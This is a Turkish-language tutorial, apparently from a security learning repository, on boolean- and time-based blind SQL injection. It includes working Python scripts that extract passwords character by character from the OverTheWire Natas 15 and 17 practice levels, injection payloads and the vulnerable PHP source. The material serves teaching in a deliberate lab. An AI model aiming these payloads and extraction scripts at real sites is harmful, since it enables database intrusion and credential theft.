# 🌐 Web Güvenliği — Blind SQL Injection

> Sunucu sana hata mesajı göstermiyor, sadece "var" veya "yok" diyor.
> Bu yeterli — tek bit bilgiyle, yeterli soruyla her şeyi öğrenebilirsin.

---

## 📋 İçindekiler

- [Blind SQLi Nedir?](#blind-sqli-nedir)
- [Boolean-Based Blind SQLi](#boolean-based-blind-sqli)
- [Karakter Karakter Şifre Çıkarma](#karakter-karakter-şifre-çıkarma)
- [Time-Based Blind SQLi](#time-based-blind-sqli)
- [Binary Search ile Hızlandırma](#binary-search-ile-hızlandırma)
- [Python ile Otomatize Etme](#python-ile-otomatize-etme)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## Blind SQLi Nedir?

Normal SQLi'da uygulama sorgu sonucunu doğrudan ekranda gösterir. Blind SQLi'da ise uygulama:

- Hata mesajı **göstermez**
- Sorgu sonucunu **ekrana yazmaz**
- Sadece "kullanıcı var / yok" veya "doğru / yanlış" gibi **iki farklı durum** gösterir

```
Normal SQLi:
  SELECT password FROM users WHERE id=1
  → "abc123" (şifreyi doğrudan görürsün)

Blind SQLi:
  Kullanıcı mevcut mu?  → "Bu kullanıcı var" / "Bu kullanıcı yok"
  Sadece true/false bilgisi
```

Bu iki durum arasındaki fark, sormak istediğimiz soruları oluşturur.

---

## Boolean-Based Blind SQLi

Sorgunun `true` veya `false` döndürmesini kontrol ederek bilgi çıkarırız.

### Temel Mantık

```sql
-- "natas15 kullanıcısı var mı?" → true/false
SELECT * FROM users WHERE username='natas15'

-- "natas15 kullanıcısının şifresi 'a' harfiyle başlıyor mu?" → true/false
SELECT * FROM users WHERE username='natas15' AND password LIKE 'a%'

-- "Şifrenin 1. karakteri 'W' mi?"
SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'W%'
```

Her soru bir bit bilgi verir. Yeterli soruyla tam şifreyi öğrenebiliriz.

### LIKE Operatörü

```sql
LIKE 'a%'        → 'a' ile başlayan
LIKE '%a%'       → içinde 'a' olan
LIKE 'a_'        → 'a' + herhangi bir karakter (tam 2 karakter)
LIKE 'abc%'      → 'abc' ile başlayan
```

`%` → sıfır veya daha fazla karakter
`_` → tam bir karakter

### BINARY — Büyük/Küçük Harf Duyarlı

MySQL'de LIKE büyük/küçük harfe duyarsızdır:

```sql
password LIKE 'W%'    → 'W' veya 'w' ile başlayan (ikisi de eşleşir)
BINARY password LIKE 'W%'   → sadece büyük 'W' ile başlayan
```

Şifreleri çıkarırken `BINARY` kullanmak daha doğru sonuç verir.

---

## Karakter Karakter Şifre Çıkarma

### Yöntem 1: LIKE ile Prefix Testi

Her pozisyon için tüm karakterleri dene:

```sql
-- 1. karakter 'a' mı?
SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'a%'

-- 1. karakter 'b' mi?
SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'b%'

-- 1. karakter 'W' mi? → TRUE → devam et
SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'W%'

-- 2. karakter 'a' mı?
SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'Wa%'
...
```

Her karakter için: küçük harfler (26) + büyük harfler (26) + rakamlar (10) = 62 deneme.

32 karakterlik şifre için → 32 × 62 = ~2000 istek. Yavaş ama çalışır.

### Yöntem 2: SUBSTRING + Eşitlik

```sql
-- Şifrenin 1. karakteri 'W' mi?
SELECT * FROM users WHERE username='natas15' 
  AND SUBSTRING(password, 1, 1) = 'W'

-- Şifrenin 2. karakteri 'A' mi?
SELECT * FROM users WHERE username='natas15' 
  AND SUBSTRING(password, 1, 2) = 'WA'
```

`SUBSTRING(str, başlangıç, uzunluk)` — 1-indexed.

### Yöntem 3: ASCII + Sayısal Karşılaştırma

```sql
-- 1. karakterin ASCII değeri 87'den büyük mü? (87 = 'W')
SELECT * FROM users WHERE username='natas15'
  AND ASCII(SUBSTRING(password, 1, 1)) > 87
```

Bu yöntem binary search ile birleşince çok hızlıdır.

---

## Time-Based Blind SQLi

Bazen uygulama true/false için görsel fark bile oluşturmuyor. Bu durumda `SLEEP()` fonksiyonu kullanılır.

```sql
-- Eğer koşul doğruysa 5 saniye bekle, yanlışsa beklemeden döner
SELECT * FROM users WHERE username='natas17' 
  AND IF(BINARY password LIKE 'W%', SLEEP(5), 1)
```

```python
import time, requests

start = time.time()
# İstek gönder
elapsed = time.time() - start

if elapsed > 4:   # 5 saniye bekledi → koşul TRUE
    print("Bu karakter doğru!")
```

Natas 17 için bu yöntem gereklidir — ekranda hiçbir şey gösterilmez.

---

## Binary Search ile Hızlandırma

Her karakter için 62 deneme yerine binary search kullanırsak ~6 denemede bulabiliriz.

### Mantık

```
Karakter ASCII değeri 32-127 arasında
Orta nokta: 79

ASCII değeri > 79 mu?
  Evet → [80-127] arasında ara
  Hayır → [32-79] arasında ara

Her adımda aralığı yarıya indir
```

```python
def find_char(position, session, url, username, password):
    low, high = 32, 127

    while low <= high:
        mid = (low + high) // 2

        # ASCII değeri mid'den büyük mü?
        payload = f'natas16" AND ASCII(SUBSTRING(password,{position},1))>{mid}-- '
        r = session.post(url, data={'username': payload}, auth=(username, password))

        if "This user exists" in r.text:
            low = mid + 1
        else:
            # Tam eşit mi kontrol et
            payload_eq = f'natas16" AND ASCII(SUBSTRING(password,{position},1))={mid}-- '
            r2 = session.post(url, data={'username': payload_eq}, auth=(username, password))
            if "This user exists" in r2.text:
                return chr(mid)
            else:
                high = mid - 1

    return None
```

---

## Python ile Otomatize Etme

### Natas 15 — Boolean-Based (LIKE)

```python
import requests
import string

url      = "http://natas15.natas.labs.overthewire.org/"
username = "natas15"
password = "[natas15_şifresi]"

chars    = string.ascii_letters + string.digits   # a-z + A-Z + 0-9
found    = ""

while True:
    found_next = False
    for c in chars:
        candidate = found + c
        payload = f'natas16" AND BINARY password LIKE "{candidate}%"-- '
        r = requests.post(
            url,
            data={"username": payload},
            auth=(username, password)
        )
        if "This user exists" in r.text:
            found += c
            print(f"[+] Bulunan: {found}")
            found_next = True
            break

    if not found_next:
        break   # şifrenin sonuna ulaştık

print(f"\n[✓] Şifre: {found}")
```

### Natas 17 — Time-Based (SLEEP)

```python
import requests, time, string

url      = "http://natas17.natas.labs.overthewire.org/"
username = "natas17"
password = "[natas17_şifresi]"

chars  = string.ascii_letters + string.digits
found  = ""

for position in range(1, 33):   # 32 karakterlik şifre
    for c in chars:
        payload = (
            f'natas18" AND IF(BINARY password LIKE "{found + c}%",'
            f'SLEEP(1),0)-- '
        )
        start = time.time()
        requests.post(url, data={"username": payload}, auth=(username, password))
        elapsed = time.time() - start

        if elapsed >= 1:
            found += c
            print(f"[+] Pozisyon {position}: {c} | Şimdiye kadar: {found}")
            break
```

---

## Natas'ta Kullanım

### Natas 15 — Kullanıcı Var/Yok Blind SQLi

**Kaynak kod:**

```php
<?php
$query = "SELECT * from users where username=\"" . $_REQUEST["username"] . "\"";
$res = mysql_query($query, $link);
if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.";
    } else {
        echo "This user doesn't exist.";
    }
}
?>
```

**İki durum:**
- `"This user exists."` → sorgu TRUE
- `"This user doesn't exist."` → sorgu FALSE

**Manuel test:**

```
Username: natas16" AND BINARY password LIKE "W%"-- 
→ "This user exists." → şifre W ile başlıyor!

Username: natas16" AND BINARY password LIKE "WA%"-- 
→ "This user exists." → ikinci karakter A!
```

**Otomatik Python scriptiyle:** yukarıdaki kodu çalıştır → tüm şifreyi bulur.

---

### Natas 17 — SLEEP Blind SQLi

**Kaynak kod:**

```php
<?php
$query = "SELECT * from users where username=\"" . $_REQUEST["username"] . "\"";
$res = mysql_query($query, $link);
if($res) {
    if(mysql_num_rows($res) > 0) {
        // HİÇBİR ŞEY YAZMAZ — görsel fark yok!
    }
}
?>
```

Ekranda hiçbir fark yok. Time-based yöntem zorunlu.

---

### Blind SQLi — Kontrol Listesi

```
Tespit:
  ☐ Normal SQLi hata mesajı veriyor mu? (Hayır → Blind olabilir)
  ☐ İki farklı durum var mı? (var/yok, doğru/yanlış, hızlı/yavaş)
  ☐ ' OR 1=1-- ile ' OR 1=2-- farklı sonuç veriyor mu?

Yöntem seç:
  ☐ Görsel fark var mı? → Boolean-based
  ☐ Görsel fark yok mu? → Time-based (SLEEP)

Otomatize et:
  ☐ requests kütüphanesi ile Python script yaz
  ☐ Karakter seti belirle: string.ascii_letters + string.digits
  ☐ LIKE ile prefix testi veya binary search kullan
  ☐ BINARY kullan (büyük/küçük harf duyarlı)
```

---

## 🔗 Kaynaklar

- [PortSwigger — Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PortSwigger — SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP — Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)

---

**Önceki konu:** [11_sql_injection.md](./11_sql_injection.md)
**Sonraki konu:** [13_command_injection_ileri.md](./13_command_injection_ileri.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
